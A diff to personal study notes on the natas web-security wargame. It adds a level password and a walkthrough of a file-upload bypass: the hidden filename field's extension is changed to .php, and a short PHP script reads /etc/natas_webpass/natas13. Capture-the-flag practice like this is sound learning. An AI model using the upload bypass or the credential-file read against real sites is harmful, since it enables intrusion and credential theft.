@@ -77,3 +77,19 @@ and for the key's length didnt match exactly we want\
 3. b64 and php's main usage is some text are not humanReadable but computer storable or dealable? so store as data, then use b64 to handle
 more to see natas11-12's php script
 4. XOR have switch, A^B = B^A, based
+
+#### l13. g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
+1.by given code, this level dont have ext checker
+2.it's rename a file like /upload/randomName.ext
+3.this ext are get from \
+`$_POST["filename"]`\
+and this variable "filename" are:\
+`<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`
+so change this to .php all things will be fine\
+php:
+```
+<?php
+$file = '/etc/natas_webpass/natas13';
+readfile($file);
+?>
+```
